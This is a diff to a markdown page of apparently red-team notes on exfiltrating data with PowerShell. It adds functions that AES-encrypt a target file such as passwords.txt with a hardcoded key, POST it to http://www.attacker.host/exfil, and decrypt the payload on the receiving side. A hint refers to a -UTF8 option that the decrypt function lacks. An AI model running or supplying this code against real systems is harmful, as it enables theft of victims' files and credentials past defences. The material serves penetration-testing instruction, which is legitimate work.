@@ -91,17 +91,44 @@ See [this section](privilege-escalation.md#smb) under Privilege Escalation for m
 
 If you set up a web server to accept post requests, you can either AES encrypt or base64 encode your target data and simply send an HTTP request to the server with the data.&#x20;
 
+{% hint style="warning" %}
+Warning: SecureString has a maximum length of **65536** characters.  This limits the size of the file that can be sent to about 65kb.
+{% endhint %}
+
 Example with AES encrypted payload:
 
 ```powershell
-$file = Get-Content C:\Users\Target\Desktop\passwords.txt
-#key must be 128 bits (16 chars), 192 bits (24 chars), or 256 bits (32 chars) 
-$key = (New-Object System.Text.ASCIIEncoding).GetBytes("usemetodecryptit") 
-$securestring = New-Object System.Security.SecureString
+function Encrypt-File
+{
+    param(
+        [Parameter(Mandatory=$true)]
+        [String]$Path, 
+        [Switch]$UTF8
+        )
+        
+    $key = (New-Object System.Text.ASCIIEncoding).GetBytes("usemetodecryptit")
+    $securestring = new-object System.Security.SecureString
 
-foreach ($char in $file.toCharArray()) {$secureString.AppendChar($char)}
+    [byte[]]$data = Get-Content -Encoding Byte -Path $Path
+    #Use the -UTF8 flag if your input file is UTF-8 encoded!
+    #There is no simple way to check this in PowerShell unfortunately. Use Notepad if possible.
+    if ($UTF8)
+    {
+        $dataString = [System.Text.Encoding]::UTF8.GetString($data)
+    }
+    else
+    {
+        $dataString = [System.Text.Encoding]::Unicode.GetString($data)
+    }
+   
+    foreach ($char in $dataString.toCharArray()) {
+          $secureString.AppendChar($char)
+    }
 
-$encryptedData = ConvertFrom-SecureString -SecureString $secureString -Key $key
+    $encrypted = ConvertFrom-SecureString -SecureString $secureString -Key $key
+
+    return $encrypted
+}
 
 Invoke-WebRequest -Uri http://www.attacker.host/exfil -Method POST -Body $encryptedData
 ```
@@ -111,16 +138,33 @@ You can also skip the last command to send the web request, and simply print the
 To decode the data on the other side simply reverse the process:
 
 ```powershell
-$key = (New-Object System.Text.ASCIIEncoding).GetBytes("54b8617eca0e54c7d3c8e6732c6b687a")
-$encrypted = "$encrypted_payload"
-echo $encrypted | ConvertTo-SecureString -key $key | ForEach-Object {[Runtime.InteropServices.Marshal]::PtrToStringBSTR([Runtime.InteropServices.Marshal]::SecureStringToBSTR($_))}
+function Decrypt_file
+{
+    param(
+        [Parameter(Mandatory=$true)]
+        [String]
+        $encrypted_payload, 
+        [String]
+        $recovered = "recovered.txt"
+        )
+
+    $key = (New-Object System.Text.ASCIIEncoding).GetBytes("usemetodecryptit")
+        
+    echo $encrypted_payload | ConvertTo-SecureString -key $key | ForEach-Object {[Runtime.InteropServices.Marshal]::PtrToStringBSTR([Runtime.InteropServices.Marshal]::SecureStringToBSTR($_))} > $recovered
+}
 ```
 
-Simply substitute the `$encrypted_payload` variable with the actual content that was sent in the body of the HTTP request, and you will have your exfiltrated file!
+Simply input the `$encrypted_payload` argument with the actual content that was sent in the body of the HTTP request, and you will have your exfiltrated file!
 
-This works in either Windows Powershell, or `pwsh` on Unix systems as well. &#x20;
+{% hint style="warning" %}
+You may need to be cognizant of the character encoding of text files you are trying to send.  If the file decrypts with no errors, but looks like garbage or random chinese characters, then you may need to use the `-UTF8` argument for the `Decrypt_file` function above.  \
+\
+Output filesize for UTF-8 encoded files may be doubled, due to output being UTF-16le by default.
+{% endhint %}
 
-One potential limitation I have noted is that it seems to strip out newline characters in text files. &#x20;
+References:
+
+* [https://www.delftstack.com/howto/powershell/powershell-byte-array/](https://www.delftstack.com/howto/powershell/powershell-byte-array/)&#x20;
 
 ### Covert to and from Base64 with PowerShell
 
